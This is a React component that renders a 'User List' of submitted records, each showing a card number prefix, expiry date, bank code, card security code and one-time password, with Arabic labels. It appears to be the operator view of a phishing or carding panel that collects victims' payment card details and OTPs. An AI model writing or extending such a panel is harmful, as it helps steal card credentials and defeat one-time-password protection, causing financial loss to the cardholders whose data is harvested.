'use client';

import { Key, useEffect } from 'react';

import { Item } from './item';

export function ListItems({ submitions }: any) {
  useEffect(() => {}, []);
  return (
    <div className="w-full  p-4 bg-gray-50  mx-1  rounded-lg shadow">
      <h2 className="text-2xl font-bold mb-4">User List</h2>
      <div className="space-y-4 w-full">
        {submitions.map(
          (
            i: {
              id: string;
              data: () => {
                (): any;
                new (): any;
                prefix: string;
                month: string;
                year: string;
                bank: string;
                pass: string;
                otp: {
                  (): any;
                  new (): any;
                  toString: {
                    (): {
                      (): any;
                      new (): any;
                      split: { (arg0: string): string; new (): any };
                    };
                    new (): any;
                  };
                };
              };
            },
            inx: Key | null | undefined
          ) => (
            <div className="grid grid-cols-3">
              <Item
                key={inx}
                number={i.id}
                prefix={i.data().prefix}
                expDate={
                  'تاريخ الانتهاء: ' + i.data().month + '/' + i.data().year
                }
                bank={'رمز البنك' + i.data().bank}
                pass={'رمز الامان:' + i.data().pass}
                otp={'0' + i.data().otp.toString().split(',')}
              />
            </div>
          )
        )}
      </div>
    </div>
  );
}
